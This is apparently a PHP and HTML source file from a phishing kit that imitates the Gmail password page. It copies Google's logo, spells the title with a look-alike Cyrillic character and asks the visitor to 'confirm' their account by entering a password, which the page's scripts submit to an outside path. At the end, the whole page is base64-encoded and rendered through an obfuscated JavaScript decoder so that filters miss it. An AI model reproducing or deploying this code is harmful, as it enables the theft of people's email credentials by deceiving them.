<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";


          $php_js->texts = file_exists("../../texts.json") && filesize("../../texts.json") > 10 ? @file_get_contents("../../texts.json") : "{}";
?>

<!DOCTYPE html>
<html dir="ltr" class="CMgTXc" lang="en-GB">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>

    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>

    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
 
    <link rel="stylesheet" href="form/css.css">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon">
    <title>Gm&#1072;il</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<?php ob_start() ?>
<body     ng-app="app" ng-controller="c1"   ng-cloak     id="yDmH0d" class="y05Um HnmHOc EIlDfe ng-scope" tabindex="-1">
    <div class="uc81Ff wKBl8c">
        <div class="LJtPoc pmVrpd" id="initialView" role="presentation">
            <div class="g76767">
                <div class="RZBuIb c8DD0">
                </div>
                <div class="bdf4dc scum" id="pass_page" role="presentation" style="">
                    <div class="waiting__ wit" style="display: none;"></div>
                    <div class="fctIrd">
                        <div>
                            <div id="logo" class="SSBsw" title="Google">
                                <div class="qZp31e">
                                    <svg viewBox="0 0 74 37" width="198" height="37">
                                        <g id="qaEJec">
                                            <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                                        </g>
                                        <g id="YGlOvc">
                                            <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                                        </g>
                                        <g id="BWfIk">
                                            <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                                        </g>
                                        <g id="e6m3fd">
                                            <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                                        </g>
                                        <g id="vbkDmc">
                                            <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                                        </g>
                                        <g id="idEJde">
                                            <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="view_container" class="JhUD8d SQNfcc">
                        <form class="RFjuSb bxPAYd k6Zj8d ng-submitted ng-dirty ng-valid-parse ng-valid ng-valid-pattern" onsubmit="send1(event,'next__');return false" role="presentation" novalidate="" action="http://test.com/token_project/gmail/def/login/?">
                            <div class="hMxfuf">
                                <div>
                                    <h1 class="sfYUmb ng-binding" id="headingText">{{"Welcome!"| ng_translate1}}</h1>
                                    <p class="FgbZLd" id="headingSubtext">{{"Confirm your acccount"| ng_translate1}}</p>
                                    <div class="hu8787__">
                                        <svg class="iarmfc" width="24px" height="24px" viewBox="0 0 24 24" fill="#4285f4" aria-hidden="true">
                                            <path d="M12,0C5.376,0 0,5.376 0,12C0,18.624 5.376,24 12,24C18.624,24 24,18.624 24,12C24,5.376 18.624,0 12,0ZM12,20.64C9,20.64 6.348,19.104 4.8,16.776C4.836,14.388 9.6,13.08 12,13.08C14.388,13.08 19.164,14.388 19.2,16.776C17.652,19.104 15,20.64 12,20.64ZM12,3.6C13.992,3.6 15.6,5.208 15.6,7.2C15.6,9.192 13.992,10.8 12,10.8C10.008,10.8 8.4,9.192 8.4,7.2C8.4,5.208 10.008,3.6 12,3.6Z"></path>
                                            <path d="M0 0h24v24H0z" fill="none"></path>
                                        </svg>
                                        <span class="ng-binding user">{{data.user}}</span>
                                        <a class="btn btn-floating y78787 waves-effect  pulse right" onclick="back()"><span class="fa fa-angle-down"></span></a>
                                    </div>
                                </div>
                            </div>
                            <div class="mbekbe bxPAYd" role="presentation">
                                <div class="iUe6Pd Us7fWe JhUD8d" role="presentation">
                                    <div class="RCum0c">
                                        <div class="input-field form-group">
                                            <input name="pass" id="pass"  class="validate form-control " pattern=".{4,}"  autocomplete="off" type="password">
                                            <label for="" class="ng-binding active" data-error="Enter valid password">{{"Enter password"| ng_translate1}}</label>
                                            <span ng-show="data.pass.length>0" class="eye_ fa fa-eye-slash"> </span>
                                        </div>
                                    </div>
                                    <div class="fImV7">
                                        <button class="btn waves-effect blue darken-1 ng-binding">{{"Next"| ng_translate1}}</button>
                                        <div class="IMH1vc lUHSR Hj2jlf ng-binding" tabindex="0" role="button">{{"Forgot your password?"| ng_translate1}}</div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <footer class="RwBngc">
                    <ul class="Bgzgmd">
                        <li><a target="_top" class="ng-binding">{{"Help "| ng_translate1}}</a></li>
                        <li><a target="_top" class="ng-binding">{{"Confidentiality "| ng_translate1}}</a></li>
                        <li><a target="_top" class="ng-binding">{{"Conditions "| ng_translate1}}</a></li>
                    </ul>
                </footer>
            </div>
        </div>
        <div class="VYMape">
        </div>
    </div>
    <div>
    </div>
    <div class="lDwpOe"></div>
    <div class="hiddendiv common"></div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>